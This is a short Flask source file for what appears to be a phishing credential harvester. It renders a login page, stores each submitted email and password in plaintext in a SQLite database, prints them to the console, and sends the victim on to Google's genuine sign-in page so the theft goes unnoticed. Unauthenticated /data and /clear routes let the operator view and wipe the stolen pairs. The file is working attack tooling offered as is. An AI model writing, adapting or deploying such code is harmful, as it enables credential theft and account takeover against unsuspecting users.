from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy

app=Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///main.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db=SQLAlchemy(app)

class Data(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	email = db.Column(db.String, nullable=False)
	password = db.Column(db.String, nullable=False)

@app.route('/', methods=['GET', 'POST'])
def index():
	if request.method == 'POST':
		email = request.form['email']
		password = request.form['password']
		print(email, password)
		new_data = Data(email=email, password=password)
		db.session.add(new_data)
		db.session.commit()
		return redirect('https://accounts.google.com/signin')
	return render_template('login.html')

@app.route('/data')
def data():
	all_data = Data.query.all()
	return render_template('data.html', datas=all_data)

@app.route('/clear')
def clear():
	db.session.query(Data).delete()
	db.session.commit()
	return redirect('/data')


@app.errorhandler(404)
def not_found(e):
  return render_template("404.html")


if __name__ == '__main__':
	app.run(host='0.0.0.0', port=80)
